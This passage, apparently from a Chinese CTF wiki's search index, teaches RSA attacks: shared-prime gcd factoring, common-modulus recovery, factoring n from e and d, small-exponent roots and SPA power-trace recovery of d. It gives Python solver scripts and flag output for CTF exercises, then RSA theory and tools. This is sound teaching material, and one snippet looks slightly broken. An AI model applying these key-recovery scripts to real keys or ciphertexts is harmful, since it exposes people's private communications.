<p>\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u6765\u89e3\u5bc6\u4e86\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7b2c\u4e00\u5bf9\u516c\u94a5\u5bc6\u7801\u3002\u4ee3\u7801\u5982\u4e0b</p> <pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\nimport gmpy2\nfrom base64 import b64decode\nn1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\nn2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\np1 = gmpy2.gcd(n1, n2)\nq1 = n1 / p1\ne = 65537\nphin = (p1 - 1) * (q1 - 1)\nd = gmpy2.invert(e, phin)\ncipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7\nplain = gmpy2.powmod(cipher, d, n1)\nplain = hex(plain)[2:]\nif len(plain) % 2 != 0:\n    plain = '0' + plain\nprint plain.decode('hex')\n</code></pre> <p>\u6700\u540e\u89e3\u5bc6\u5982\u4e0b</p> <pre><code>\u279c  scaf-rsa2 git:(master) \u2717 python exp.py       \nsH1R3_PRlME_1N_rsA_iS_4ulnEra5le\n</code></pre> <p>\u89e3\u538b\u538b\u7f29\u5305\u5373\u53ef\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_7","title":"\u5171\u6a21\u653b\u51fb","text":""},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_8","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5f53\u4e24\u4e2a\u7528\u6237\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570 N\u3001\u4e0d\u540c\u7684\u79c1\u94a5\u65f6\uff0c\u52a0\u5bc6\u540c\u4e00\u660e\u6587\u6d88\u606f\u65f6\u5373\u5b58\u5728\u5171\u6a21\u653b\u51fb\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#_9","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u8bbe\u4e24\u4e2a\u7528\u6237\u7684\u516c\u94a5\u5206\u522b\u4e3a e_1 \u548c e_2\uff0c\u4e14\u4e24\u8005\u4e92\u8d28\u3002\u660e\u6587\u6d88\u606f\u4e3a m\uff0c\u5bc6\u6587\u5206\u522b\u4e3a\uff1a</p>  c_1 = m^{e_1}\\bmod N \\\\ c_2 = m^{e_2}\\bmod N  <p>\u5f53\u653b\u51fb\u8005\u622a\u83b7 c_1 \u548c c_2 \u540e\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u51fa\u660e\u6587\u3002\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u51fa re_1+se_2=1\\bmod n \u7684\u4e24\u4e2a\u6574\u6570 r \u548c s\uff0c\u7531\u6b64\u53ef\u5f97\uff1a</p>  \\begin{align*} c_{1}^{r}c_{2}^{s} &amp;\\equiv m^{re_1}m^{se_2}\\bmod n\\\\ &amp;\\equiv m^{(re_1+se_2)} \\bmod n\\\\ &amp;\\equiv m\\bmod n \\end{align*}"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#xman","title":"XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60","text":"<p>\u9898\u76ee\u63cf\u8ff0\uff1a</p> <pre><code>{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773}\n\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839}\n\nmessage1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n</code></pre> <p>\u9898\u76ee\u6765\u6e90\uff1aXMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60 </p> <p>\u53ef\u4ee5\u770b\u51fa\u4e24\u4e2a\u516c\u94a5\u7684 N \u662f\u4e00\u6837\u7684\uff0c\u5e76\u4e14\u4e24\u8005\u7684 e \u4e92\u7d20\u3002\u5199\u4e00\u4e2a\u811a\u672c\u8dd1\u4e00\u4e0b\uff1a</p> <pre><code>import gmpy2\nn = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249\ne1 = 773\n\ne2 = 839\n\nmessage1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n# s &amp; t\ngcd, s, t = gmpy2.gcdext(e1, e2)\nif s &lt; 0:\n    s = -s\n    message1 = gmpy2.invert(message1, n)\nif t &lt; 0:\n    t = -t\n    message2 = gmpy2.invert(message2, n)\nplain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n\nprint plain\n</code></pre> <p>\u5f97\u5230</p> <pre><code>\u279c  Xman-1-class-exercise git:(master) \u2717 python exp.py\n1021089710312311910410111011910111610410511010710511610511511211111511510598108101125\n</code></pre> <p>\u8fd9\u65f6\u5019\u9700\u8981\u8003\u8651\u5f53\u65f6\u660e\u6587\u662f\u5982\u4f55\u8f6c\u5316\u4e3a\u8fd9\u4e2a\u6570\u5b57\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u662f 16 \u8fdb\u5236\u8f6c\u6362\uff0cASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u6216\u8005 Base64 \u89e3\u5bc6\u3002\u8fd9\u4e2a\u5e94\u8be5\u662f ASCII \u5b57\u7b26\u8f6c\u6362\uff0c\u8fdb\u800c\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u4ee3\u7801\u5f97\u5230 flag</p> <pre><code>i = 0\nflag = \"\"\nplain = str(plain)\nwhile i &lt; len(plain):\n    if plain[i] == '1':\n        flag += chr(int(plain[i:i + 3]))\n        i += 3\n    else:\n        flag += chr(int(plain[i:i + 2]))\n        i += 2\nprint flag\n</code></pre> <p>\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f7f\u7528 1 \u6765\u5224\u65ad\u662f\u5426\u4e3a\u4e09\u4f4d\u957f\u5ea6\uff0c\u662f\u56e0\u4e3a flag \u4e00\u822c\u90fd\u662f\u660e\u6587\u5b57\u7b26\uff0c\u800c 1 \u5f00\u5934\u7684\u957f\u5ea6\u4e3a 1 \u6216\u8005 2 \u7684\u6570\u5b57\uff0c\u4e00\u822c\u90fd\u662f\u4e0d\u53ef\u89c1\u5b57\u7b26\u3002</p> <p>flag</p> <pre><code>\u279c  Xman-1-class-exercise git:(master) \u2717 python exp.py\nflag{whenwethinkitispossible}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#edn","title":"\u5df2\u77e5e\u548cd\uff0c\u5206\u89e3n","text":"<pre><code>import random\nfrom gmpy2 import *\n\ndef getpq(n, e, d):\n    while True:\n        k = e * d - 1\n        g = random.randint(0, n)\n        while k % 2 == 0:\n            k = k // 2\n            temp = powmod(g, k, n) - 1\n            if gcd(temp,n) &gt; 1 and temp != 0:\n                return gcd(temp, n)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#edn_1","title":"\u5df2\u77e5e*d\uff0c\u5206\u89e3n","text":"<pre><code>from random import randint\n\ndef oddR(r):\n    while r%2==0:\n        r=r//2\n    return r\n\ndef func(e_d, N):\n    k = e_d - 1            \n    r = oddR(k)           #\u6c42\u51fak=2^t*r\u4e2d\u7684r\n    while True:\n        b = randint(2, N-1)    #\u83b7\u53d6\u533a\u95f4(2,N-1)\u7684\u4e00\u4e2a\u968f\u673a\u6570\n        a = powmod(b, r, N)   \n        if a == 1:            \n            continue    \n        y = gcd(a-1, N)\n        if a &gt; 1 and y &gt; 1:    \n            q = N // y\n            return q\n        else:\n            r = r * 2     \n\np = func(Q_E_D, Q_n)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_module_attack/#n_1","title":"n\u975e\u5e38\u5927\uff0c\u76f4\u63a5\u5f00\u6839\u53f7","text":"<p>\u901a\u5e38n\u548ce\u901a\u8fc7\u6587\u4ef6\u7ed9\u51fa\uff0c\u6587\u4ef6\u5927\u5c0f\u53ef\u80fd\u8fbe\u5230\u51e0\u4e2aM\uff0c\u8bfb\u53d6\u6587\u4ef6\u9700\u8981\u8f83\u957f\u65f6\u95f4</p> <p>\u6b64\u65f6\uff0c\u6709</p>  m^e=c&lt;n  <p>\u6240\u4ee5\u76f4\u63a5\u5bf9\u5bc6\u6587\u5f00\u65b9\u5373\u53ef</p> <pre><code>from gmpy2 import *\nimport Crypto.PublicKey.RSA as RSA\n\nwith open(\"pubkey.pem\", \"r\") as f:\n   ciph = RSA.importKey(f.read())     \n# chill out, Crypto.RSA takes its sweet time... (minutes)\nc, e = ciph.n, ciph.e\neth_root = gmpy2.iroot(c, e)\nm = int(eth_root[0])\n</code></pre> <p>Note</p> <p>\u5c0f\u6280\u5de7\uff1a\u901a\u5e38\u516c\u94a5\u6587\u4ef6\u7684\u6700\u540e\u4e00\u6bb5\u5c31\u662fe\uff0c\u56e0\u6b64\u53ef\u4ee5\u6253\u5f00\u516c\u94a5\u6587\u4ef6\uff0c\u590d\u5236\u6700\u540e\u4e00\u6bb5\uff0cbase64\u89e3\u7801\uff0c\u770b\u770b\u672b\u5c3e\u6709\u6ca1\u6709\u5e38\u7528\u7684e\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u8bfb\u53d6\u516c\u94a5\u6587\u4ef6\u7684\u65f6\u95f4\uff08\u8fd9\u79cd\u60c5\u51b5\u89e3\u5bc6\u4e0d\u9700\u8981n\uff09</p>"},{"location":"crypto/asymmetric/rsa/rsa_pkcs_attack/","title":"Bleichenbacher's attack","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <ul> <li>PKCS 1.5 \u6807\u51c6\u4e2d\u53ef\u4ee5\u4f2a\u9020 RSA \u7b7e\u540d\u200b</li> </ul> <p>Warning</p> <p>\u5f85\u8865\u5145\u3002</p> <ul> <li>http://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/","title":"RSA \u4fa7\u4fe1\u9053\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08\u4fa7\u4fe1\u9053\u653b\u51fb\uff09\u662f\u4e00\u79cd\u80fd\u591f\u4ece\u5bc6\u7801\u8bbe\u5907\u4e2d\u83b7\u53d6\u79d8\u5bc6\u4fe1\u606f\u7684\u5bc6\u7801\u653b\u51fb\u65b9\u6cd5\uff0e\u4e0e\u5176 \u4ed6\u653b\u51fb\u65b9\u6cd5\u4e0d\u540c\uff1a\u8fd9\u79cd\u653b\u51fb\u5229\u7528\u7684\u662f\u5bc6\u7801\u8bbe\u5907\u7684\u80fd\u91cf\u6d88\u8017\u7279\u5f81\uff0c\u800c\u975e\u5bc6\u7801\u7b97\u6cd5\u7684\u6570\u5b66\u7279\u6027\uff0e\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u4e00\u79cd\u975e\u5165\u4fb5\u5f0f\u653b\u51fb\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u65b9\u4fbf\u5730\u8d2d\u4e70\u5b9e\u65bd\u653b\u51fb\u6240\u9700\u8981\u7684\u8bbe\u5907\uff1a\u6240\u4ee5\u8fd9\u79cd\u653b\u51fb\u5bf9\u667a\u80fd\u5361\u4e4b\u7c7b\u7684\u5bc6\u7801\u8bbe\u5907\u7684\u5b89\u5168\u6027\u9020\u6210\u4e86\u4e25\u91cd\u5a01\u80c1\u3002</p> <p>\u80fd\u91cf\u5206\u6790\u653b\u51fb\u662f\u5b89\u5168\u9886\u57df\u5185\u975e\u5e38\u91cd\u8981\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u53ea\u5728\u8fd9\u91cc\u7b80\u5355\u8ba8\u8bba\u4e0b\u3002</p> <p>\u80fd\u91cf\u5206\u6790\u653b\u51fb\u5206\u4e3a\uff1a - \u7b80\u5355\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08SPA\uff09\uff0c\u5373\u5bf9\u80fd\u91cf\u8ff9\u8fdb\u884c\u76f4\u89c2\u5206\u6790\uff0c\u8089\u773c\u770b\u5373\u53ef\u3002 - \u5dee\u5206\u80fd\u91cf\u5206\u6790\u653b\u51fb\uff08DPA\uff09\uff0c\u57fa\u4e8e\u80fd\u91cf\u8ff9\u4e4b\u95f4\u7684\u76f8\u5173\u7cfb\u6570\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_1","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u653b\u51fb\u8005\u53ef\u83b7\u53d6\u4e0e\u52a0\u89e3\u5bc6\u76f8\u5173\u7684\u4fa7\u4fe1\u9053\u4fe1\u606f\uff0c\u4f8b\u5982\u80fd\u91cf\u6d88\u8017\u3001\u8fd0\u7b97\u65f6\u95f4\u3001\u7535\u78c1\u8f90\u5c04\u7b49\u7b49\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_2","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 HITB 2017 \u7684 Hack in the card I \u4f5c\u4e3a\u4f8b\u5b50\u3002</p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86\u516c\u94a5\u6587\u4ef6 <code>publickey.pem</code>\uff0c\u5bc6\u6587\uff0c\u6d4b\u91cf\u667a\u80fd\u5361\u529f\u7387\u7684\u7535\u8def\u56fe\uff0c\u548c\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u667a\u80fd\u5361\u6d88\u8017\u7684\u529f\u7387\u53d8\u5316\uff08\u901a\u8fc7\u5728\u7ebf\u7f51\u7ad9\u7ed9\u51fa trace\uff09\u3002</p> <p></p> <p>\u5bc6\u6587\uff1a <pre><code>014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046\n</code></pre></p>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_3","title":"\u5206\u6790","text":"<p>\u7531\u4e8e\u7f51\u7ad9\u53ea\u7ed9\u51fa\u4e86\u4e00\u6761\u80fd\u91cf\u8ff9\uff0c\u6240\u4ee5\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f Simple channel analysis\uff08SPA\uff09\u653b\u51fb\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u89c2\u5bdf\u80fd\u91cf\u8ff9\u7684\u9ad8\u4f4e\u7535\u5e73\u6765\u83b7\u5f97 RSA \u89e3\u5bc6\u8fc7\u7a0b\u7684\u5bc6\u94a5 d\u3002 RSA \u53ef\u88ab SPA \u653b\u51fb\u7684\u7406\u8bba\u57fa\u7840\u6765\u81ea\u4e8e RSA \u4e2d\u5305\u542b\u7684\u5feb\u901f\u5e42\u53d6\u4f59\u7b97\u6cd5\u3002</p> <p>\u5feb\u901f\u5e42\u7b97\u6cd5\u5982\u4e0b</p> <ol> <li>b \u4e3a\u5076\u6570\u65f6\uff0ca^b \\bmod c = ({a^2}^{b/2}) \\bmod c\u3002</li> <li>b \u4e3a\u5947\u6570\u65f6\uff0ca^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c\u3002</li> </ol> <p>\u76f8\u5e94\u7684 C \u4ee3\u7801\u5b9e\u73b0\u4e3a\uff1a <pre><code>int PowerMod(int a, int b, int c)\n{\nint ans = 1;\na = a % c;\nwhile(b&gt;0) {\nif(b % 2 == 1) // \u5f53b\u4e3a\u5947\u6570\u65f6\u4f1a\u591a\u6267\u884c\u4e0b\u9762\u7684\u6307\u4ee4\nans = (ans * a) % c;\nb = b/2;\na = (a * a) % c;\n}\nreturn ans;\n}\n</code></pre></p> <p>\u7531\u4e8e\u5feb\u901f\u5e42\u7684\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4f1a\u9010\u4f4d\u5224\u65ad\u6307\u6570\u7684\u53d6\u503c\uff0c\u5e76\u4f1a\u91c7\u53d6\u4e0d\u540c\u7684\u64cd\u4f5c\uff0c\u6240\u4ee5\u53ef\u4ece\u80fd\u91cf\u8ff9\u4e2d\u8fd8\u539f\u51fa d \u7684\u53d6\u503c\uff08\u4ece\u4e0a\u9762\u53ef\u77e5\uff0c\u76f4\u63a5\u5f97\u5230\u7684\u503c\u662f d \u7684\u4e8c\u8fdb\u5236\u53d6\u503c\u7684\u9006\u5e8f\uff09\u3002</p> <p>\u6ce8\u610f\uff1a</p> <p>\u6709\u65f6\u5019\u6a21\u4e58\u4e5f\u53ef\u80fd\u4f1a\u4ece\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u8fdb\u884c\u6a21\u4e58\u3002\u8fd9\u91cc\u662f\u4ece\u4f4e\u4f4d\u5411\u9ad8\u4f4d\u6a21\u4e58\u3002</p> <p></p> <p>\u7531\u6b64\u53ef\u7ed9\u51fa\u8fd8\u539f d \u7684\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>f = open('./data.txt')\ndata = f.read().split(\",\")\nprint('point number:', len(data))\n\nstart_point = 225   # \u5f00\u59cb\u5206\u6790\u7684\u70b9\nmid = 50            # \u91c7\u6837\u70b9\u95f4\u9694\nfence = 228         # \u9ad8\u4f4e\u7535\u5e73\u5206\u754c\u7ebf\n\nbin_array = []\n\nfor point_index in range(start_point, len(data), mid):\n    if float(data[point_index]) &gt; fence:\n        bin_array.append(1)\n    else:\n        bin_array.append(0)\n\nbin_array2 = []\nflag1 = 0\nflag2 = 0\nfor x in bin_array:\n    if x:\n        if flag1:\n            flag2 = 1\n        else:\n            flag1 = 1\n    else:\n        if flag2:\n            bin_array2.append(1)\n        else:\n            bin_array2.append(0)\n        flag1 = 0\n        flag2 = 0\n\n# d_bin = bin_array2[::-1]\nd_bin = bin_array2\nd = \"\".join(str(x) for x in d_bin)[::-1]\nprint(d)\nd_int = int(d,2)\nprint(d_int)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_side_channel/#_4","title":"\u53c2\u8003\u8d44\u6599","text":"<ol> <li>Mangard, S., Oswald, E., Popp, T., \u51af\u767b\u56fd, \u5468\u6c38\u5f6c, &amp; \u5218\u7ee7\u4e1a. (2010). \u80fd\u91cf\u5206\u6790\u653b\u51fb.</li> </ol>"},{"location":"crypto/asymmetric/rsa/rsa_theory/","title":"RSA \u4ecb\u7ecd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002</p> <p>RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_1","title":"\u57fa\u672c\u539f\u7406","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#_2","title":"\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f","text":"<ol> <li>\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 p \u548c q\uff0c\u8ba1\u7b97 N = p \\times q</li> <li>\u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)</li> <li>\u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \\varphi (N) \u7684\u6574\u6570 e\uff0c\u4f7f e \u548c \\varphi (N) \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 e \u5173\u4e8e \\varphi (N) \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a d\uff0c\u6709 ed\\equiv 1 \\pmod {\\varphi (N)}</li> <li>\u5c06 p\u200b \u548c q\u200b \u7684\u8bb0\u5f55\u9500\u6bc1</li> </ol> <p>\u6b64\u65f6\uff0c(N,e) \u662f\u516c\u94a5\uff0c(N,d) \u662f\u79c1\u94a5\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_3","title":"\u6d88\u606f\u52a0\u5bc6","text":"<p>\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e N\uff0c\u4e14\u4e0e N \u4e92\u8d28\u7684\u6574\u6570 m\u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a</p>  m^{e}\\equiv c\\pmod N"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_4","title":"\u6d88\u606f\u89e3\u5bc6","text":"<p>\u5229\u7528\u5bc6\u94a5 d\u200b \u8fdb\u884c\u89e3\u5bc6\u3002</p>  c^{d}\\equiv m\\pmod N"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_5","title":"\u6b63\u786e\u6027\u8bc1\u660e","text":"<p>\u5373\u6211\u4eec\u8981\u8bc1m^{ed} \\equiv m \\bmod N\uff0c\u5df2\u77e5ed \\equiv 1 \\bmod \\phi(N)\uff0c\u90a3\u4e48 ed=k\\phi(N)+1\uff0c\u5373\u9700\u8981\u8bc1\u660e</p>  m^{k\\phi(N)+1}  \\equiv m \\bmod N  <p>\u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e</p> <p>\u7b2c\u4e00\u79cd\u60c5\u51b5 gcd(m,N)=1\u200b\uff0c\u90a3\u4e48 m^{\\phi(N)} \\equiv 1 \\bmod N\u200b\uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002</p> <p>\u7b2c\u4e8c\u79cd\u60c5\u51b5 gcd(m,N)\\neq 1\uff0c\u90a3\u4e48 m \u5fc5\u7136\u662f p \u6216\u8005 q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n=m \u5c0f\u4e8e N\u3002\u6211\u4eec\u5047\u8bbe</p>  m=xp  <p>\u90a3\u4e48 x \u5fc5\u7136\u5c0f\u4e8e q\uff0c\u53c8\u7531\u4e8e q \u662f\u7d20\u6570\u3002\u90a3\u4e48</p>  m^{\\phi(q)} \\equiv 1 \\bmod q  <p>\u8fdb\u800c</p>  m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q  <p>\u90a3\u4e48</p>  m^{k\\phi(N)+1}=m+uqm  <p>\u8fdb\u800c</p>  m^{k\\phi(N)+1}=m+uqxp=m+uxN  <p>\u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_6","title":"\u57fa\u672c\u5de5\u5177","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsatool","title":"RSAtool","text":"<ul> <li> <p>\u5b89\u88c5</p> <pre><code>git clone https://github.com/ius/rsatool.git\ncd rsatool\npython rsatool.py -h\n</code></pre> </li> <li> <p>\u751f\u6210\u79c1\u94a5</p> <pre><code>python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321\n</code></pre> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-converter","title":"RSA Converter","text":"<ul> <li>\u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6</li> <li>\u6839\u636e n\uff0ce\uff0cd \u5f97\u51fa p\uff0cq</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#openssl","title":"openssl","text":"<ul> <li> <p>\u67e5\u770b\u516c\u94a5\u6587\u4ef6</p> <pre><code>openssl rsa -pubin -in pubkey.pem -text -modulus\n</code></pre> </li> <li> <p>\u89e3\u5bc6</p> <pre><code>rsautl -decrypt -inkey private.pem -in flag.enc -out flag\n</code></pre> </li> </ul> <p>\u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 <code>openssl --help</code>\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_7","title":"\u5206\u89e3\u6574\u6570\u5de5\u5177","text":"<ul> <li>\u7f51\u7ad9\u5206\u89e3\uff0cfactor.db</li> <li>\u547d\u4ee4\u884c\u5206\u89e3\uff0cfactordb-pycli\uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002</li> <li>yafu</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#python","title":"python \u5e93","text":""},{"location":"crypto/asymmetric/rsa/rsa_theory/#primefac","title":"primefac","text":"<p>\u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy","title":"gmpy","text":"<ul> <li><code>gmpy.root(a, 